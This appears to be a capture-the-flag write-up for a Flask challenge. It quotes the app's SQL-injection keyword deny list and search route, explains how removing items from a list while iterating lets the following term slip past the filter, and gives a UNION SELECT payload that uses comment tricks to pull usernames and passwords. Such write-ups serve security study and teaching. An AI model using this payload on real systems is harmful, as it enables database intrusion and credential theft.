![image](https://github.com/user-attachments/assets/2e49caca-0651-40cd-be99-4338a684a621)

# credit
Thank you [@Baba is dead](https://github.com/Zhongbob) for sharing the solution

# Solution
The vulnerability lies within these few lines of code.

```
def detect_sqli(sql):
    # List of common SQL keywords and characters often used in SQL injection
    disallowed_patterns = [
        r"SELECT", r"UNION", r"JOIN", r"FROM", r"WHERE", r"ON",
        r"OR", r"AND", r"NOT", r"IN", r"LIKE", r"DROP", r"INSERT",
        r"DELETE", r"UPDATE", r"EXEC", r"EXECUTE", r"CREATE", r"ALTER",
        "--", "#", ";", "/*", "*/", "@@", "0x", "'", "\"", "`", "-", "/", "*"
    ]

    # Escape special characters and combine patterns into a single regex
    escaped_patterns = [re.escape(pattern) if not pattern.isalnum() else pattern for pattern in disallowed_patterns]
    combined_pattern = re.compile("|".join(escaped_patterns), re.IGNORECASE)

    # Check if any disallowed pattern is found in the SQL query
    if combined_pattern.search(sql):
        return True

    return False

@app.route('/filter', methods=["POST"])
def filter():
    if not session.get('is_logged_in'):
        return redirect(url_for('login'))
    with connect(g.uuid) as conn:
        search = request.form['search']
        terms = search.split(" ")
        query = "SELECT name,location,description from targets"
        for term in terms:
            if detect_sqli(term):
                terms.remove(term)
        if terms:
            location_match = " OR ".join(f"name LIKE '%{term}%'" for term in terms)
            name_match = " OR ".join(f"location LIKE '%{term}%'" for term in terms)
            description_match = " OR ".join(f"description LIKE '%{term}%'" for term in terms)
            query += " WHERE " + " OR ".join([location_match,name_match,description_match])
            print(query)
        cursor = conn.execute(query)
        targets = cursor.fetchall()
        targets = list(targets)
    return jsonify(targets)
```

The reason that it's vulnerable that if one term is detected, it will be removed but the next few following terms won't.

![image](https://github.com/user-attachments/assets/78fb50ae-1d9d-4d78-9661-df446349be7f)

Therefore, we can give a payload like such

```
-- dhadhlsjldas%'/**/UNION/**/SELECT/**/username,password,userId/**/FROM/**/users--
```

Since spaces are being split, we can use a /**/ to bypass that space filter.

![image](https://github.com/user-attachments/assets/4581b6ac-ba76-4952-817b-d143cfcf029d)
